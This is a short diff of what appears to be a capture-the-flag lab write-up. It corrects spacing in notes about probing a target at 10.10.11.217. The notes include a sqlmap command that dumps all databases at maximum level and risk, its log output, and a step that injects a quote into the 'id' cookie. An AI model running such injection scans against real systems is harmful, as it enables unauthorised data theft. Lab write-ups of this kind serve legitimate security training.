@@ -6,12 +6,12 @@ Ports:
 80
 ```
 
-Nothinginterestingfoundsearchingdirectoris,higestports.
-aftercaptureburprequest,singleparametersuspectisCookie
+Nothing interesting found searching directoris, higest ports.
+try use sqlmap 
 
 >sqlmap -u http://10.10.11.217/ --dump-all --level 5 --risk 3 --batch
-	[02:59:05][INFO]testingconnectiontothetargetURL
-	youhavenotdeclaredcookie(s),whileserverwantstosetitsown('id=5f9d79710af...8d71d695f5').
+	[02:59:05] [INFO] testing connection to the target URL
+	you have not declared cookie(s), while server wants to set it sown('id=5f9d79710af...8d71d695f5').
 
 edit cookie id='
 	#response
